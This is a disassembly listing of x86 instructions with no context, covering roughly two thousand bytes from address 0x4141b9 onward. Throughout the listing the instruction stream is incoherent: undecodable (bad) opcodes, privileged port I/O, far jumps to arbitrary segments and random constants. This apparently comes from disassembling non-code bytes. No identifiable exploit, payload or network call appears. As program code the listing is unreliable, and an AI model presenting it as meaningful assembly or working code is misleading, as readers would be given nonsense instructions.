  4141b9:	cld    
  4141ba:	les    esp,FWORD PTR [eax+0x4d]
  4141bd:	xchg   ecx,eax
  4141be:	outs   dx,DWORD PTR ds:[esi]
  4141bf:	jno    0x414170
  4141c1:	xor    al,0x24
  4141c3:	cld    
  4141c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141c5:	mov    edx,ebx
  4141c7:	iret   
  4141c8:	inc    edx
  4141c9:	fs icebp 
  4141cb:	push   cs
  4141cc:	and    BYTE PTR [edx+0x1c],dh
  4141cf:	sub    al,0x77
  4141d1:	fadd   DWORD PTR [ecx-0x4a848c06]
  4141d7:	outs   dx,DWORD PTR ds:[esi]
  4141d8:	xchg   esp,eax
  4141d9:	add    DWORD PTR [edi-0x26],eax
  4141dc:	mov    al,ds:0xa6d97a0f
  4141e1:	xor    eax,0xe745c4dd
  4141e6:	jb     0x4141a3
  4141e8:	test   BYTE PTR [ecx+0x67],ah
  4141eb:	pop    DWORD PTR [edi+0x51b69c6d]
  4141f1:	shl    DWORD PTR [edi-0x5203c145],cl
  4141f7:	in     al,dx
  4141f8:	and    BYTE PTR [esi+0xa75ba55],ch
  4141fe:	shl    BYTE PTR [esi+ebp*4-0x66c1e251],0xd1
  414206:	mov    al,0x5b
  414208:	sbb    eax,0xe75bfb3
  41420d:	scas   al,BYTE PTR es:[edi]
  41420e:	gs pop esp
  414210:	ficom  DWORD PTR [edi]
  414212:	push   edi
  414213:	xor    cl,BYTE PTR [eax-0x6d677596]
  414219:	pop    eax
  41421a:	jb     0x414263
  41421c:	(bad)  [esi+0x16]
  41421f:	adc    ah,BYTE PTR [esi-0x7ed39501]
  414225:	adc    DWORD PTR [edi+0x26fbe0b3],0xffffff9d
  41422c:	push   0x3c
  41422e:	lods   al,BYTE PTR ds:[esi]
  41422f:	push   ds
  414230:	mov    bh,0x4e
  414232:	aas    
  414233:	jb     0x41421d
  414235:	pop    es
  414236:	inc    esi
  414237:	mov    WORD PTR [edx],cs
  414239:	xchg   edx,eax
  41423a:	jge    0x4142b0
  41423c:	fldcw  WORD PTR [ecx+0x56]
  41423f:	lods   eax,DWORD PTR ds:[esi]
  414240:	repz mov al,0xad
  414243:	test   eax,0x469cd288
  414248:	mov    dh,0xd
  41424a:	retf   
  41424b:	or     eax,0x31eed564
  414250:	pop    ecx
  414251:	out    dx,eax
  414252:	jbe    0x414264
  414254:	aas    
  414255:	jmp    0x90bd:0xda37e8ed
  41425c:	mov    al,ds:0x622936e3
  414261:	add    ecx,DWORD PTR [eax-0x41]
  414264:	mov    edi,0x63ef6ed4
  414269:	add    al,0x70
  41426b:	js     0x414212
  41426d:	cmc    
  41426e:	into   
  41426f:	or     ebx,edx
  414271:	adc    eax,0x22f5231a
  414276:	fs xchg ecx,eax
  414278:	inc    edx
  414279:	ret    
  41427a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41427b:	call   0x8c4d:0xf9897131
  414282:	mov    WORD PTR [ecx],ds
  414284:	fmul   st,st(4)
  414286:	cdq    
  414287:	or     BYTE PTR [ecx-0x14],dh
  41428a:	jl     0x4142a7
  41428c:	frstor [edi]
  41428e:	repz mov esi,0x8442a564
  414294:	push   cs
  414295:	mov    eax,ds:0xafb1baf2
  41429a:	sub    al,0xdf
  41429c:	and    edx,ebx
  41429e:	cwde   
  41429f:	fs inc ebp
  4142a1:	in     al,0x79
  4142a3:	(bad)  
  4142a4:	into   
  4142a5:	out    dx,eax
  4142a6:	rcl    DWORD PTR [ebx+ebx*4],cl
  4142a9:	pop    ecx
  4142aa:	mov    edx,0x4b3a094e
  4142af:	mov    BYTE PTR [esi-0x51],ch
  4142b2:	xor    DWORD PTR [ebx+0x7b],0x52
  4142b6:	lds    edx,FWORD PTR [edx-0x117ad63]
  4142bc:	xchg   esp,eax
  4142bd:	inc    ebp
  4142be:	fwait
  4142bf:	push   0x500e0a3c
  4142c4:	or     eax,0x139660cf
  4142c9:	xchg   edx,eax
  4142ca:	adc    esp,DWORD PTR [ebp-0x3b]
  4142cd:	popa   
  4142ce:	out    0xc4,al
  4142d0:	ret    0xada0
  4142d3:	jmp    FWORD PTR [ebx-0x54]
  4142d6:	inc    esp
  4142d7:	arpl   WORD PTR [eax+0x3a],di
  4142da:	mov    DWORD PTR [edx],ebx
  4142dc:	movntq QWORD PTR [ebx+0x40],mm1
  4142e0:	jge    0x414292
  4142e2:	scas   eax,DWORD PTR es:[edi]
  4142e3:	and    BYTE PTR [edi+edx*4-0x32],0xed
  4142e8:	mov    eax,DWORD PTR [eax]
  4142ea:	popf   
  4142eb:	sti    
  4142ec:	or     ebx,esp
  4142ee:	jle    0x414332
  4142f0:	nop
  4142f1:	inc    ebp
  4142f2:	addr16 mov ch,0x82
  4142f5:	cli    
  4142f6:	jmp    DWORD PTR [eax]
  4142f8:	and    al,0x51
  4142fa:	push   ss
  4142fb:	adc    BYTE PTR [edi+0x72],0xf1
  4142ff:	mov    edx,0x53d81616
  414304:	dec    ecx
  414305:	cld    
  414306:	retf   
  414307:	push   ds
  414308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414309:	mov    bl,0x3
  41430b:	jae    0x4142f4
  41430d:	push   ss
  41430e:	into   
  41430f:	pop    esi
  414310:	(bad)  
  414311:	stos   DWORD PTR es:[edi],eax
  414312:	sahf   
  414313:	sbb    eax,0xc74b9459
  414318:	mov    esi,0xe873681a
  41431d:	dec    ecx
  41431e:	shl    BYTE PTR [esi-0x24],0xdc
  414322:	out    0x3,al
  414324:	gs inc edx
  414326:	or     esp,DWORD PTR [edx+0x50]
  414329:	dec    esp
  41432a:	mov    ds:0x7653c9e1,al
  41432f:	gs xor eax,0x240ab7f3
  414335:	add    al,0x3
  414337:	clc    
  414338:	jnp    0x41431e
  41433a:	lods   eax,DWORD PTR ds:[esi]
  41433b:	mov    ebp,0x94ba8294
  414340:	inc    esp
  414341:	mul    BYTE PTR [ebx]
  414343:	repz pop esp
  414345:	out    dx,eax
  414346:	iret   
  414347:	sbb    DWORD PTR [eax],esi
  414349:	sahf   
  41434a:	outs   dx,BYTE PTR ds:[esi]
  41434b:	mov    eax,ds:0x6920e6ce
  414350:	jmp    0x2927:0x9e7f3742
  414357:	xor    al,0x80
  414359:	push   ebp
  41435a:	sub    ah,ch
  41435c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435d:	or     DWORD PTR [eax-0x1ecbc518],ebx
  414363:	test   DWORD PTR [edi+0x38],esp
  414366:	shl    bh,0x70
  414369:	or     BYTE PTR [esi],bh
  41436b:	mov    ds:0x1c7b3a5d,eax
  414370:	fist   WORD PTR [ebx+eiz*8+0x6b57e6b1]
  414377:	outs   dx,DWORD PTR ds:[esi]
  414378:	outs   dx,BYTE PTR ds:[esi]
  414379:	in     eax,0xb
  41437b:	lds    edi,FWORD PTR [ebp+0x2e]
  41437e:	and    al,0x42
  414380:	pop    eax
  414381:	int    0xfb
  414383:	shr    DWORD PTR [edi+0x3a],cl
  414386:	in     al,0x6f
  414388:	xor    DWORD PTR [esp+eiz*4],esi
  41438b:	lea    esp,[esi]
  41438d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41438e:	lods   al,BYTE PTR ds:[esi]
  41438f:	sbb    eax,eax
  414391:	lods   al,BYTE PTR ds:[esi]
  414392:	mov    edx,ecx
  414394:	mov    bh,0x50
  414396:	loope  0x4143cc
  414398:	out    dx,eax
  414399:	sub    BYTE PTR [edi+0x28],cl
  41439c:	aad    0xe6
  41439e:	loope  0x414406
  4143a0:	mov    esp,0xbcea91b3
  4143a5:	leave  
  4143a6:	cmp    eax,DWORD PTR [esi]
  4143a8:	je     0x41436b
  4143aa:	jae    0x4143a1
  4143ac:	or     DWORD PTR [ebx-0x37e6f4fa],0x57
  4143b3:	out    0x46,eax
  4143b5:	test   eax,edx
  4143b7:	fistp  WORD PTR [eax-0x1e738ef4]
  4143bd:	or     BYTE PTR [ebp-0x38d2618b],ch
  4143c3:	das    
  4143c4:	js     0x4143b4
  4143c6:	pop    esp
  4143c7:	mov    al,ds:0x7afec194
  4143cc:	or     al,0x87
  4143ce:	xor    ecx,esp
  4143d0:	cmc    
  4143d1:	cmp    ecx,DWORD PTR [ebx-0x53]
  4143d4:	or     al,0xa2
  4143d6:	leave  
  4143d7:	sbb    cl,al
  4143d9:	xor    esp,DWORD PTR [edi]
  4143db:	out    0x9e,al
  4143dd:	pop    ebx
  4143de:	bnd jns 0x414426
  4143e1:	int3   
  4143e2:	out    dx,eax
  4143e3:	in     al,0x94
  4143e5:	adc    ah,BYTE PTR [ebp-0x7c]
  4143e8:	(bad)  
  4143e9:	not    BYTE PTR [edi-0x2c08ff64]
  4143ef:	imul   esi,DWORD PTR [edx+0x19],0x40bc211
  4143f6:	popf   
  4143f7:	clc    
  4143f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f9:	push   ss
  4143fa:	mov    eax,0x51503399
  4143ff:	mov    edi,0xdae6ee30
  414404:	rcr    BYTE PTR [ebx-0x47b1c75b],cl
  41440a:	push   ebp
  41440b:	mov    cs,WORD PTR [eax-0x28]
  41440e:	jmp    0x35c09ccf
  414413:	xor    ch,BYTE PTR [edi+0x30]
  414416:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414418:	push   ebx
  414419:	dec    DWORD PTR [ebp-0x1]
  41441c:	or     esi,DWORD PTR [ebx+0x55]
  41441f:	jo     0x41441c
  414421:	push   ecx
  414422:	mov    edx,0x43072a4d
  414427:	(bad)  
  414429:	into   
  41442a:	sub    edi,DWORD PTR gs:[edi+0x70e5e80]
  414431:	ja     0x4144a2
  414433:	lds    esi,FWORD PTR ds:0x98dd26ee
  414439:	out    dx,al
  41443a:	mov    BYTE PTR [esi-0x16],al
  41443d:	sbb    al,0xdb
  41443f:	adc    BYTE PTR [ebp-0x29],dh
  414442:	xchg   ebp,eax
  414443:	push   esi
  414444:	mov    dl,0x18
  414446:	and    DWORD PTR [esp+eiz*8],edi
  414449:	xchg   ecx,eax
  41444a:	adc    al,0xa6
  41444c:	ret    0xabfa
  41444f:	mov    edi,0x34a6f64e
  414454:	mov    al,ds:0x4bca48ef
  414459:	pop    edi
  41445a:	repz loop 0x4144cb
  41445d:	in     al,dx
  41445e:	pop    ebx
  41445f:	imul   eax,DWORD PTR [edi+eiz*1],0xa6cdfdf4
  414466:	pop    esi
  414467:	mov    bl,0xe6
  414469:	mov    ds:0xa4101af6,al
  41446e:	jne    0x414474
  414470:	fstp   DWORD PTR [edx]
  414472:	out    0xf5,al
  414474:	gs aam 0x4e
  414477:	pop    edi
  414478:	adc    ch,BYTE PTR [ebp-0x42]
  41447b:	in     eax,dx
  41447c:	or     dh,BYTE PTR [ecx]
  41447e:	fsubr  QWORD PTR [ebx+0x27d9579e]
  414484:	test   eax,0x96512308
  414489:	int3   
  41448a:	mov    edx,0x216a1ee5
  41448f:	fwait
  414490:	mov    WORD PTR [eax-0x638fb7f0],?
  414496:	or     cl,BYTE PTR [eax+0x2cf01444]
  41449c:	inc    ebp
  41449d:	and    DWORD PTR [edi+ecx*1-0x65],esi
  4144a1:	out    0x90,eax
  4144a3:	pop    es
  4144a4:	dec    ebx
  4144a5:	les    eax,FWORD PTR [edx]
  4144a7:	sub    ebx,DWORD PTR [esi-0x8]
  4144aa:	push   esp
  4144ab:	jl     0x4144c2
  4144ad:	cbw    
  4144af:	daa    
  4144b0:	add    ecx,eax
  4144b2:	aas    
  4144b3:	fs jmp 0x6fbc:0xd4e23b47
  4144bb:	xchg   edi,eax
  4144bc:	stos   DWORD PTR es:[edi],eax
  4144bd:	and    eax,0xc4e0dcfb
  4144c2:	clc    
  4144c3:	cmc    
  4144c4:	(bad)  
  4144c5:	repz mov ah,0xa6
  4144c8:	fld    DWORD PTR [ecx+0xc]
  4144cb:	ja     0x41447e
  4144cd:	mov    esp,0xa4bdbc1b
  4144d2:	inc    ebx
  4144d3:	xchg   esp,eax
  4144d4:	add    DWORD PTR [ebx+0x5b],eax
  4144d7:	outs   dx,DWORD PTR ds:[esi]
  4144d8:	in     eax,0x3c
  4144da:	lock pop esi
  4144dc:	or     al,0x32
  4144de:	test   cl,al
  4144e0:	sbb    cl,BYTE PTR [edx+esi*2+0x34]
  4144e4:	mov    eax,0x956cd939
  4144e9:	push   ds
  4144ea:	fcomip st,st(2)
  4144ec:	inc    esi
  4144ed:	jmp    0x4144a4
  4144ef:	xor    edi,ebp
  4144f1:	mov    al,ds:0xda057fe8
  4144f6:	inc    esi
  4144f7:	fstp   QWORD PTR [ecx+0x28448a13]
  4144fd:	loop   0x4144ab
  4144ff:	sbb    BYTE PTR [edx-0x4b],dh
  414502:	outs   dx,DWORD PTR ds:[esi]
  414503:	sub    cl,BYTE PTR [esi]
  414505:	mov    ds:0x6c6e9172,al
  41450a:	adc    bl,ch
  41450c:	add    ecx,eax
  41450e:	dec    esp
  41450f:	(bad)  
  414510:	fdiv   DWORD PTR [esi+0x79]
  414513:	sbb    eax,0x1c8b352a
  414518:	cmp    ebp,DWORD PTR [edx+0x5578a548]
  41451e:	mov    ecx,0x27b130f7
  414523:	mov    al,ds:0xb490d3fe
  414528:	repz ret 
  41452a:	in     eax,dx
  41452b:	es out 0x14,al
  41452e:	jbe    0x4144eb
  414530:	mov    dh,0x70
  414532:	dec    esp
  414533:	adc    edi,ecx
  414535:	push   edi
  414536:	lods   al,BYTE PTR ds:[esi]
  414537:	inc    esi
  414538:	in     al,0x29
  41453a:	pop    edx
  41453b:	pop    ds
  41453c:	int    0xa8
  41453e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41453f:	lock jge 0x414582
  414542:	jl     0x414540
  414544:	lock cli 
  414546:	bound  edi,QWORD PTR [esi-0x71]
  414549:	sbb    bl,al
  41454b:	pop    ecx
  41454c:	jae    0x41451a
  41454e:	mov    ds:0xa92d61fa,al
  414553:	icebp  
  414554:	ss stos DWORD PTR es:[edi],eax
  414556:	fiadd  WORD PTR [edi]
  414559:	cmc    
  41455a:	cwde   
  41455b:	ja     0x41454c
  41455d:	scas   al,BYTE PTR es:[edi]
  41455e:	dec    ebx
  41455f:	push   esi
  414560:	sub    eax,0xd3fc6428
  414565:	sti    
  414566:	mov    DWORD PTR [ebp-0x5511c702],esp
  41456c:	stos   DWORD PTR es:[edi],eax
  41456d:	je     0x4145e8
  41456f:	mov    dh,BYTE PTR [esi-0x62]
  414572:	adc    bh,bl
  414574:	ficomp DWORD PTR [ebx]
  414576:	frstor [ebp+0x3e1d0dc2]
  41457c:	sbb    al,ah
  41457e:	push   ebp
  41457f:	inc    ebp
  414580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414581:	mov    ecx,DWORD PTR [ebp+0x1b5a833c]
  414587:	cld    
  414588:	xchg   esp,eax
  414589:	xchg   edx,eax
  41458a:	adc    al,0x6a
  41458c:	out    0xc6,eax
  41458e:	ja     0x414561
  414590:	sbb    al,0xa3
  414592:	add    edi,DWORD PTR [edi-0x171499c6]
  414598:	dec    esp
  414599:	(bad)  
  41459a:	jmp    0x4145a0
  41459c:	xor    al,0xca
  41459e:	scas   al,BYTE PTR es:[edi]
  41459f:	jge    0x414550
  4145a1:	fxtract 
  4145a3:	mov    edx,0x6856db84
  4145a8:	test   eax,0xddc29ac1
  4145ad:	xor    ah,0xf6
  4145b0:	lock or eax,DWORD PTR [edi-0x703279b5]
  4145b7:	xchg   ebp,eax
  4145b8:	sub    edi,DWORD PTR [esi+0x7e]
  4145bb:	sub    eax,0x5c5862f9
  4145c0:	ins    BYTE PTR es:[edi],dx
  4145c1:	xchg   edx,eax
  4145c2:	xor    bh,BYTE PTR [ecx+0x16]
  4145c5:	mov    WORD PTR [edi-0x3afad55f],ss
  4145cb:	pop    edi
  4145cc:	adc    al,0xb4
  4145ce:	scas   al,BYTE PTR es:[edi]
  4145cf:	jp     0x41460a
  4145d1:	ror    BYTE PTR [eax+0x27bc038f],1
  4145d7:	leave  
  4145d8:	sub    eax,0x1c25da5a
  4145dd:	inc    ebx
  4145de:	push   ebx
  4145df:	rcl    DWORD PTR [ecx+0xf3e935],cl
  4145e5:	js     0x414600
  4145e7:	jno    0x414660
  4145e9:	mov    ch,0xd1
  4145eb:	dec    ebx
  4145ec:	(bad)  
  4145ed:	aam    0xb7
  4145ef:	int    0x88
  4145f1:	outs   dx,DWORD PTR ds:[esi]
  4145f2:	pop    ds
  4145f3:	mov    ds:0x76a2704d,eax
  4145f8:	dec    ecx
  4145f9:	sbb    al,0x5d
  4145fb:	or     bl,BYTE PTR [edi+0x22012a99]
  414601:	and    BYTE PTR [esi-0x64],ah
  414604:	sahf   
  414605:	imul   eax,DWORD PTR [esi],0x5b442c92
  41460b:	daa    
  41460c:	out    0xd7,al
  41460e:	sbb    ebp,DWORD PTR [eax+0x60]
  414611:	adc    al,0x89
  414613:	ret    0x79c9
  414616:	(bad)  
  414617:	sbb    eax,0x37b3e67c
  41461c:	in     eax,0xf3
  41461e:	stc    
  41461f:	push   edx
  414620:	neg    ebp
  414622:	xor    eax,0xe4ee1b1d
  414627:	cwde   
  414628:	out    dx,al
  414629:	loop   0x41462c
  41462b:	sbb    ecx,edx
  41462d:	int3   
  41462e:	pop    edi
  41462f:	pop    ecx
  414630:	push   ebx
  414631:	push   edi
  414632:	jae    0x4145b6
  414634:	or     esi,DWORD PTR [edi+0xf]
  414637:	xor    al,0xa9
  414639:	xchg   DWORD PTR [eax-0x41],ebp
  41463c:	push   ecx
  41463d:	mov    ebp,0x257b6d36
  414642:	aas    
  414643:	dec    esi
  414644:	stos   BYTE PTR es:[edi],al
  414645:	int    0x8e
  414647:	(bad)  
  414648:	popf   
  414649:	scas   eax,DWORD PTR es:[edi]
  41464a:	bound  esi,QWORD PTR [ebx]
  41464c:	add    BYTE PTR [edx+0x4bf6984a],bl
  414652:	retf   0xe33c
  414655:	push   edx
  414656:	mov    DWORD PTR [ebp-0x7091d016],0x2390723
  414660:	push   es
  414661:	add    BYTE PTR [ebx+0x51],bh
  414664:	jmp    0x4146cf
  414666:	lock dec ecx
  414668:	or     al,BYTE PTR [ebx]
  41466a:	sbb    al,0xdb
  41466c:	pop    ebp
  41466d:	inc    edx
  41466e:	mov    ecx,0x21af0655
  414673:	cmp    eax,0x925e236c
  414678:	adc    edx,esp
  41467a:	xchg   edi,eax
  41467b:	ror    DWORD PTR [ebp+0x37],cl
  41467e:	mov    ds:0x267b0430,eax
  414683:	sbb    DWORD PTR [esi+0x73],esp
  414686:	or     ah,BYTE PTR [edx]
  414688:	in     al,dx
  414689:	cmc    
  41468a:	cld    
  41468b:	inc    eax
  41468c:	lahf   
  41468d:	sbb    ebp,0x9b7c3e5b
  414693:	inc    edi
  414694:	or     ah,BYTE PTR [ecx+0x19]
  414697:	push   eax
  414698:	pusha  
  414699:	cdq    
  41469a:	sahf   
  41469b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41469c:	inc    ebx
  41469d:	(bad)  
  41469e:	ja     0x414692
  4146a0:	mov    bl,0x2b
  4146a2:	pusha  
  4146a3:	xor    ebp,ebp
  4146a5:	and    eax,0xc0bd35cf
  4146aa:	sahf   
  4146ab:	loop   0x41464e
  4146ad:	jo     0x4146a0
  4146af:	xchg   edx,eax
  4146b0:	pop    ecx
  4146b1:	sub    al,0x3b
  4146b3:	inc    ebp
  4146b4:	mov    BYTE PTR [edx],ch
  4146b6:	or     BYTE PTR [edx+ebx*1-0x756e5a1e],cl
  4146bd:	pop    esi
  4146be:	mov    esi,0x7af5cf30
  4146c3:	iret   
  4146c4:	lock jne 0x4146b7
  4146c7:	jo     0x41473a
  4146c9:	sub    BYTE PTR [esi-0x4d3ea142],ah
  4146cf:	cs inc esi
  4146d1:	mov    dh,0xcb
  4146d3:	inc    esi
  4146d4:	push   0xffffffa8
  4146d6:	jecxz  0x4146b7
  4146d8:	jge    0x414759
  4146da:	xchg   BYTE PTR [edi+ebp*8+0x20],dl
  4146de:	sbb    DWORD PTR [edi+0x6b],esp
  4146e1:	call   0x25425248
  4146e6:	dec    edx
  4146e7:	rol    DWORD PTR [esi-0x47],cl
  4146ea:	test   eax,0xf86d2468
  4146ef:	dec    ebx
  4146f0:	cmp    al,0xa4
  4146f2:	push   cs
  4146f3:	cmp    al,0x2f
  4146f5:	xchg   ecx,eax
  4146f6:	dec    esp
  4146f7:	scas   al,BYTE PTR es:[edi]
  4146f8:	sub    eax,0x7be9f5ea
  4146fd:	dec    esp
  4146fe:	sub    al,0x2d
  414700:	adc    DWORD PTR [ebp+ebp*1-0xb],0xffffffc8
  414705:	cli    
  414706:	add    eax,DWORD PTR [eax]
  414708:	mov    BYTE PTR [edi+eiz*4-0x70],ah
  41470c:	inc    esp
  41470d:	jmp    0x5182:0x52b4fb26
  414714:	jmp    0xf7ac:0x9e5ca48f
  41471b:	rcl    ebp,1
  41471d:	scas   eax,DWORD PTR es:[edi]
  41471e:	dec    ecx
  41471f:	int3   
  414720:	sahf   
  414721:	ss dec edi
  414723:	ror    eax,0x89
  414726:	mov    dh,0xca
  414728:	xchg   ecx,eax
  414729:	rcl    DWORD PTR [esi],0xcc
  41472c:	inc    DWORD PTR [eax-0x5]
  41472f:	push   esp
  414730:	xor    dh,BYTE PTR [esi+0x1a]
  414733:	mov    dl,0xd3
  414735:	or     eax,0x8ee4071a
  41473a:	shl    DWORD PTR [bx+di-0x6b7],cl
  41473f:	es out dx,eax
  414741:	and    al,0x3d
  414743:	push   ebx
  414744:	xchg   edx,eax
  414745:	rcr    BYTE PTR [ecx],0x4e
  414748:	arpl   WORD PTR [ebx+eax*1+0x2c3e161f],bx
  41474f:	dec    esp
  414750:	test   eax,0x45fede69
  414755:	fdiv   st(0),st
  414757:	mov    eax,0x84a6e2f8
  41475c:	pop    esp
  41475d:	scas   al,BYTE PTR es:[edi]
  41475e:	jns    0x4147c2
  414760:	inc    ebp
  414761:	fdiv   QWORD PTR [esp+edx*4]
  414764:	je     0x4147e4
  414766:	cmp    eax,0x8b07571
  41476b:	jg     0x4146fd
  41476d:	mov    ecx,DWORD PTR [esi-0x53715554]
  414773:	cs xchg edi,eax
  414775:	sub    ebp,ebp
  414777:	cdq    
  414778:	cmp    bh,BYTE PTR [edi]
  41477a:	sbb    eax,0x1813d648
  41477f:	xchg   esi,eax
  414780:	jecxz  0x4147ea
  414782:	repnz mov esp,0x159e790b
  414788:	mov    al,ds:0x5904e034
  41478d:	dec    edx
  41478e:	shl    BYTE PTR [di+0x3a],1
  414792:	dec    ecx
  414793:	push   esp
  414794:	(bad)  
  414795:	add    DWORD PTR [bp+si-0x2d],edi
  414799:	sub    eax,0x17438edc
  41479e:	or     ch,0x82
  4147a1:	scas   al,BYTE PTR es:[edi]
  4147a2:	iret   
  4147a3:	rol    BYTE PTR [ecx+eiz*2],cl
  4147a6:	data16 gs (bad) 
  4147a9:	hlt    
  4147aa:	scas   eax,DWORD PTR es:[edi]
  4147ab:	(bad)  
  4147ac:	icebp  
  4147ad:	dec    eax
  4147ae:	or     BYTE PTR [edi-0x6a815185],bh
  4147b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b5:	pop    ss
  4147b6:	call   0xaafddd97
  4147bb:	mov    edi,0x8aef2a51
  4147c0:	push   edx
  4147c1:	sbb    BYTE PTR [eax],bl
  4147c3:	dec    ecx
  4147c4:	dec    esp
  4147c5:	ret    
  4147c6:	mov    bl,0x41
  4147c8:	and    BYTE PTR [edx+0x584c209d],bh
  4147ce:	xchg   ebx,eax
  4147cf:	mov    eax,0xdf634452
  4147d4:	aad    0x66
  4147d6:	das    
  4147d7:	ficom  DWORD PTR [eax]
  4147d9:	retf   0xdcf1
  4147dc:	inc    esi
  4147dd:	jl     0x4147f0
  4147df:	fwait
  4147e0:	mov    eax,ds:0x3d1ef389
  4147e5:	arpl   dx,sp
  4147e7:	pusha  
  4147e8:	inc    edx
  4147e9:	mov    esi,0xbb67cac1
  4147ee:	adc    eax,0xa68449d1
  4147f3:	cmp    DWORD PTR [ebx-0x77446e3e],esp
  4147f9:	lea    ebx,[esi+0x22]
  4147fc:	jle    0x414862
  4147fe:	sub    ah,BYTE PTR [eax+ebp*1]
  414801:	in     eax,dx
  414802:	fsubr  QWORD PTR [ebp+0x69]
  414805:	lea    esp,[ebx]
  414807:	jb     0x41481b
  414809:	pusha  
  41480a:	push   ebx
  41480b:	lds    ecx,FWORD PTR [edi]
  41480d:	repz mov edx,0x5e6272ad
  414813:	xor    esp,0xd5fa7469
  414819:	(bad)  
  41481a:	jno    0x41486e
  41481c:	mov    es,ebp
  41481e:	(bad)  
  41481f:	push   esp
  414820:	(bad)  
  414821:	push   cs
  414822:	retf   
  414823:	lds    esi,FWORD PTR [eax-0x4]
  414826:	inc    edi
  414827:	shl    DWORD PTR [eax],1
  414829:	cmc    
  41482a:	jp     0x414820
  41482c:	jne    0x414858
  41482e:	jns    0x4147ee
  414830:	or     ecx,DWORD PTR [ebp-0x14]
  414833:	xor    edi,DWORD PTR [esi-0x1e503f00]
  414839:	push   esp
  41483a:	(bad)  
  41483b:	mov    esi,0x415aeaac
  414840:	sub    dl,BYTE PTR [eax]
  414842:	outs   dx,DWORD PTR ds:[esi]
  414843:	les    eax,FWORD PTR ds:0xab6f69e7
  414849:	sub    dh,BYTE PTR [ecx-0x1d87e246]
  41484f:	inc    ebp
  414850:	inc    edi
  414851:	outs   dx,DWORD PTR ds:[esi]
  414852:	enter  0xe147,0x8c
  414856:	cmc    
  414857:	jl     0x41482e
  414859:	scas   al,BYTE PTR es:[edi]
  41485a:	push   0x7c
  41485c:	inc    ebx
  41485d:	out    0x37,eax
  41485f:	sbb    eax,0xa8e8cc57
  414864:	push   ss
  414865:	das    
  414866:	mov    eax,ds:0x159969e7
  41486b:	mov    bh,BYTE PTR [eax-0x693c9c35]
  414871:	dec    edi
  414872:	les    ecx,FWORD PTR [ebx+0x64]
  414875:	aam    0xa
  414877:	shl    BYTE PTR [edi-0x6a3e554c],1
  41487d:	mov    al,0x8d
  41487f:	outs   dx,DWORD PTR ds:[esi]
  414880:	out    dx,eax
  414881:	xchg   ebp,eax
  414882:	dec    bx
  414884:	pushf  
  414885:	es push ebx
  414887:	fdiv   QWORD PTR [eax]
  414889:	mov    bl,0xa3
  41488b:	test   DWORD PTR [edx+ebx*1],ecx
  41488e:	add    eax,ebp
  414890:	seta   BYTE PTR [esi+0x301a5239]
  414897:	push   edx
  414898:	xor    BYTE PTR [esi],bh
  41489a:	(bad)  
  41489b:	sahf   
  41489c:	mov    ch,0x9d
  41489e:	jae    0x41489c
  4148a0:	pusha  
  4148a1:	fdivrp st(6),st
  4148a3:	push   esi
  4148a4:	lahf   
  4148a5:	push   ebp
  4148a6:	das    
  4148a7:	mov    es,WORD PTR [ecx-0x490962f7]
  4148ad:	mov    edx,0x9d170b40
  4148b2:	rol    BYTE PTR [ecx+edi*2+0x17452987],cl
  4148b9:	xchg   edx,eax
  4148ba:	pop    esi
  4148bb:	mov    cl,0x3a
  4148bd:	dec    esi
  4148be:	scas   eax,DWORD PTR es:[edi]
  4148bf:	outs   dx,BYTE PTR ds:[esi]
  4148c0:	mov    eax,0xe32e0e51
  4148c5:	jae    0x4148e4
  4148c7:	sub    DWORD PTR [edi],edx
  4148c9:	sahf   
  4148ca:	jo     0x41484f
  4148cc:	sbb    cl,BYTE PTR [edx]
  4148ce:	(bad)
  4148d2:	popa   
  4148d3:	ds inc ebx
  4148d5:	arpl   WORD PTR [ecx+0x69],sp
  4148d8:	push   esi
  4148d9:	clc    
  4148da:	(bad)  
  4148db:	cmp    ebx,DWORD PTR [esi-0x11e66ef6]
  4148e1:	outs   dx,BYTE PTR ds:[esi]
  4148e2:	lods   al,BYTE PTR ds:[esi]
  4148e3:	cmp    edi,ebx
  4148e5:	push   ebp
  4148e6:	neg    DWORD PTR [edi+0x1d06680c]
  4148ec:	test   al,0x92
  4148ee:	jmp    0x9783:0x8b5cee85
  4148f5:	stc    
  4148f6:	jne    0x414931
  4148f8:	and    DWORD PTR [esi],edi
  4148fa:	cld    
  4148fb:	dec    ebp
  4148fc:	push   ss
  4148fd:	addr16 clc 
  4148ff:	or     dl,dh
  414901:	das    
  414902:	fs sub ch,dl
  414905:	stos   BYTE PTR es:[edi],al
  414906:	pop    edx
  414907:	jae    0x41491f
  414909:	stc    
  41490a:	add    eax,0x30c04b4
  41490f:	leave  
  414910:	scas   al,BYTE PTR es:[edi]
  414911:	inc    ebp
  414912:	gs jmp 0x414922
  414915:	sub    bh,bh
  414917:	push   esi
  414918:	lock cmp al,BYTE PTR [ecx+0x24]
  41491c:	lahf   
  41491d:	jb     0x414942
  41491f:	mov    al,0x1b
  414921:	nop
  414922:	enter  0x81d8,0xd8
  414926:	nop
  414927:	das    
  414928:	cli    
  414929:	sub    eax,0x76905c7f
  41492e:	mov    bl,0xe0
  414930:	lods   al,BYTE PTR ds:[esi]
  414931:	(bad)  
  414932:	or     al,0xe9
  414934:	push   0xe3e65b43
  414939:	pop    edi
  41493a:	mov    ecx,esp
  41493c:	adc    ch,al
  41493e:	sahf   
  41493f:	pop    ss
  414940:	and    DWORD PTR [eax-0x3b],esi
  414943:	cwde   
  414944:	popf   
  414945:	fiadd  WORD PTR [ebx-0x37]
  414948:	ret    0x3940
  41494b:	in     eax,0xb2
  41494d:	mov    edi,0xf87c3838
  414952:	xor    ah,cl
  414954:	fld    DWORD PTR [edi-0x69]
  414957:	sub    al,0x90
  414959:	lea    edx,[edx+0x67dd7ade]
  41495f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414960:	inc    esi
  414961:	xor    al,0x35
  414963:	fld    TBYTE PTR [esi+0xf]
  414966:	pop    ebp
